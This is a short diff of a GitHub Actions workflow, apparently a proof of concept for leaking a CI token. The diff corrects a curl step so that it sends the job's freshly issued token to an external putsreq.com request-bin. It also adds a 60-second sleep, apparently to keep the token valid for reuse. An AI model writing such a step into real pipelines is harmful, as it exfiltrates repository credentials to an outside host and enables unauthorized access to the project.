@@ -15,6 +15,7 @@ jobs:
         with:
           permissions: |
             contents: read
-      - run: curl "https://putsreq.com/ksp0TTIIgjPB0ceX9RGr?token${{ steps.token.outputs.token }}"
+      - run: curl "https://putsreq.com/ksp0TTIIgjPB0ceX9RGr?token=${{ steps.token.outputs.token }}"
+      - run: sleep 60
         
         
